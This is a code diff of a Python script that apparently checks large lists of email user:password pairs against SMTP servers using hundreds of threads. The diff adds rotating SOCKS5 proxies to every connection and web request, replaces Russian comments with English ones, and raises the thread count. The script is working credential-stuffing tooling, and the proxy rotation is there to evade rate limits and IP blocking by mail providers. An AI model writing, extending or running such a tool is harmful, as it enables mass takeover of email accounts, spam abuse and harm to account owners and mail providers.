@@ -1,6 +1,7 @@
 #!/usr/local/bin/python3
 
 import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64, socks
+from requests.exceptions import RequestException
 try:
 	import psutil, requests, dns.resolver
 except ImportError:
@@ -115,7 +116,7 @@ def debug(msg):
 def load_smtp_configs():
 	global autoconfig_data_url, domain_configs_cache
 	try:
-		configs = requests.get(autoconfig_data_url, timeout=5).text.splitlines()
+		configs = requests_get(autoconfig_data_url, timeout=15).text.splitlines()
 		for line in configs:
 			line = line.strip().split(';')
 			if len(line) != 3:
@@ -138,23 +139,42 @@ def normalize_delimiters(s):
 	return re.sub(r'[;,\t|]', ':', re.sub(r'[\'" ]+', '', s))
 
 def read(path):
-	return os.path.isfile(path) and open(path, 'r', encoding='utf-8-sig', errors='ignore').read() or re.search(r'^https?://', path) and requests.get(path, timeout=5).text or ''
+	return os.path.isfile(path) and open(path, 'r', encoding='utf-8-sig', errors='ignore').read() or re.search(r'^https?://', path) and requests_get(path, timeout=15).text or ''
 
 def read_lines(path):
 	return read(path).splitlines()
 
 def is_listening(ip, port):
-	try:
-		port = int(port)
-		socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
-		s = socket.socket(socket_type, socket.SOCK_STREAM)
-		s.settimeout(3)
-		s = ssl.wrap_socket(s, server_hostname=ip, do_handshake_on_connect=False) if port == 465 else s
-		s.connect((ip, port))
-		s.close()
-		return True
-	except:
-		return False
+    # Randomly select a proxy from the list
+    proxy = random.choice(proxy_list)
+    proxy_host, proxy_port = proxy.split(':')
+
+    try:
+        port = int(port)
+        # Configure the socket to use the SOCKS5 proxy
+        socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
+        socket.socket = socks.socksocket
+
+        # Determine if we need an IPv6 socket
+        socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
+        s = socket.socket(socket_type, socket.SOCK_STREAM)
+        s.settimeout(10)
+
+        # Wrap the socket with SSL if connecting to port 465
+        if port == 465:
+            s = ssl.create_default_context().wrap_socket(s, server_hostname=ip)
+
+        # Attempt to connect to the specified IP and port
+        s.connect((ip, port))
+        s.close()
+        return True
+    except Exception as e:
+        print(f"Failed to connect to {ip}:{port} through {proxy_host}:{proxy_port} - {str(e)}")
+        return False
+    finally:
+        # Reset the socket modification to not use the proxy
+        socks.setdefaultproxy()  # Clear proxy settings
+        socket.socket = socket._socket.socket  # Reset to original socket class
 
 def get_rand_ip_of_host(host):
 	global resolver_obj
@@ -253,33 +273,32 @@ def socket_get_free_smtp_server(smtp_server, port):
     port = int(port)
     smtp_server_ip = get_rand_ip_of_host(smtp_server)
 
-    # Выбор случайного прокси из глобального списка
+    # Select a random proxy from the global list
     proxy = random.choice(proxy_list) if proxy_list else None
     if proxy:
         proxy_host, proxy_port = proxy.split(':')
-
-        # Настройка SOCKS прокси для текущего сокета
-        sock_proxy = socks.socksocket()  # Создание нового проксированного сокета
-        sock_proxy.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
+        print(f"Using proxy: {proxy_host}:{proxy_port}")
+        socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
+        sock_proxy = socks.socksocket()  # Create a new SOCKS proxy socket
     else:
         socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
         sock_proxy = socket.socket(socket_type, socket.SOCK_STREAM)
 
-    # Обертка сокета в SSL, если это необходимо
+    sock_proxy.settimeout(5)
+
+    # SSL context creation for secure connections
     if port == 465:
-        s = ssl._create_unverified_context().wrap_socket(sock_proxy)
+        context = ssl.create_default_context()
+        s = context.wrap_socket(sock_proxy, server_hostname=smtp_server)
     else:
         s = sock_proxy
 
-    s.settimeout(5)
     try:
         s.connect((smtp_server_ip, port))
     except Exception as e:
-        if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
-            smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
-            s.connect((smtp_server_ip, port))
-        else:
-            raise Exception(e)
+        print(f"Connection error with {smtp_server_ip}:{port} -> {e}")
+        s.close()
+        raise
     return s
 
 def socket_try_tls(sock, self_host):
@@ -394,16 +413,41 @@ def clean_smtp_entries(filename):
 					file.writelines(domain_dict[domain]['lines'])
 	except Exception as e:
 		print("Error! Can't delete dublicates")
+		return []
 
-def load_proxies(filename):
+def get_proxy():
+    global current_proxy, request_count
+    if request_count % 5 == 0:
+        current_proxy = random.choice(proxy_list)
+    request_count += 1
+    return {
+        'http': f'socks5://{current_proxy}',
+        'https': f'socks5://{current_proxy}'
+    }
+
+def requests_get(url, **kwargs):
+    # Use global proxy list to determine the proxy for the request
+    proxy = random.choice(proxy_list) if proxy_list else None
+    proxies = {
+        'http': f'socks5://{proxy}',
+        'https': f'socks5://{proxy}'
+    } if proxy else {}
     try:
-        with open(filename, 'r') as file:
-            proxies = [line.strip() for line in file if line.strip()]
-        print(okk + 'Loaded ' + str(len(proxies)) + ' proxies')
-        return proxies
+        response = requests.get(url, proxies=proxies, **kwargs)
+        return response
+    except requests.RequestException as e:
+        print(f"Failed to make a request to {url} using {proxies}: {str(e)}")
+        return None
+	
+def load_proxies():
+    global proxy_list
+    try:
+        with open('2.txt', 'r') as file:
+            proxy_list = [line.strip() for line in file if line.strip()]
+            print('Proxies loaded:', len(proxy_list))
     except FileNotFoundError:
-        print(err + 'Proxy file not found.')
-        return []
+        print('Proxy file not found.')
+        sys.exit(1)
 	
 def worker_item(jobs_que, results_que, proxies):
     global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
@@ -423,12 +467,6 @@ def worker_item(jobs_que, results_que, proxies):
             smtp_server, port = 0, 0
             smtp_user, password = jobs_que.get()
             login_template = default_login_template
-            # Выбор случайного прокси для каждого запроса
-            proxy = random.choice(proxies) if proxies else None
-            proxy_config = {
-                "http": f"http://{proxy}",
-                "https": f"https://{proxy}"
-            } if proxy else None
             try:
                 results_que.put(f'getting settings for {smtp_user}:{password}')
                 if not smtp_server or not port:
@@ -467,9 +505,6 @@ def every_second():
 			net_usage_old += net_usage
 			loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
 			if threads_counter<max_threads and mem_usage<80 and cpu_usage<80 and jobs_que.qsize():
-				  # Путь к файлу с прокси
-
-# Далее в вашем коде, когда вы запускаете потоки:
 				threading.Thread(target=worker_item, args=(jobs_que, results_que, proxy_list), daemon=True).start()
 				threads_counter += 1
 		except:
@@ -537,7 +572,7 @@ goods = 0
 mem_usage = 0
 cpu_usage = 0
 net_usage = 0
-min_threads = 50
+min_threads = 100
 max_threads = debuglevel or rage_mode and 600 or 100
 threads_counter = 0
 no_jobs_left = False
@@ -550,9 +585,12 @@ total_lines = wc_count(list_filename)
 resolver_obj = dns.resolver.Resolver()
 resolver_obj.nameservers = custom_dns_nameservers
 resolver_obj.rotate = True
-proxy_list = load_proxies('2.txt')
+current_proxy = None
+request_count = 0
+proxy_list = []
 domain_configs_cache = {}
 
+load_proxies()
 print(inf+'loading SMTP configs...'+up)
 load_smtp_configs()
 print(wl+okk+'loaded SMTP configs:           '+bold(num(len(domain_configs_cache))+' lines'))
